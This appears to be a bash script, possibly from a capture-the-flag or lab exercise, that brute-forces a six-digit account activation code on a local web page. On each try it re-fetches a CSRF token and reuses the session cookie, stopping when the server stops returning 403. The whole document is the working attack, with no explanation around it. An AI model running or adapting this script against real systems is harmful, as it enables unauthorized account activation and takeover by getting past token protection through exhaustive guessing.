#!/bin/bash
url="http://192.168.1.33/activate.php"
for key in {000000..999999}; do
	token=$(curl -s -c cookiejar $url | awk -F 'value=' '/token/ {print $2}' | cut -d "'" -f2)
	activate=$(curl -s -w %{http_code} -b cookiejar --data "userid=14&activation_code=$key&token=${token}" $url | tail -n 1 | cut -d ">" -f2)
	if [ $activate -ne 403 ]; then
		echo "Key = "$key
		break
	fi
done
